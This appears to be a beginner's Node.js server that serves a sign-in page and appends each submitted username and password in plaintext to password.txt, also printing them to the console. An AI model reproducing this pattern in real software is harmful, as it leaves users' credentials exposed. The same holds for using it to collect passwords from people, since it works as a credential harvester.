const http = require("http");
const fs = require("fs");
const { log } = require("console");
const { brotliDecompressSync } = require("zlib");
const mainPage = fs.readFileSync("index.html", "utf8");
const signInPage = fs.readFileSync("signin.html", "utf8");
const requestHandler = (req, res) => {
  const { url, method } = req;
  if (url === "/") res.write(mainPage);
  if (url === "/signin" && method === "GET") res.write(signInPage);
  if (url === "/signin" && method === "POST") {
    let body = [];
    req.on("data", (chunk) => {
      body.push(chunk);
    });
    req.on("end", () => {
      const razer = Buffer.concat(body).toString().split("&");
      const username = razer[0].split("=")[1];
      const password = razer[1].split("=")[1];
      fs.appendFile(
        "password.txt",
        `${username + " " + password}`,
        function (err) {
          if (err) throw err;
          console.log("okkkk");
          console.log(username + password);
        }
      );
    });
  }

  res.end();
};

const server = http.createServer(requestHandler);
const PORT = 3000;
server.listen(PORT, "localhost", () => {
  console.log(`Server was started. Listening to port ${PORT}`);
});
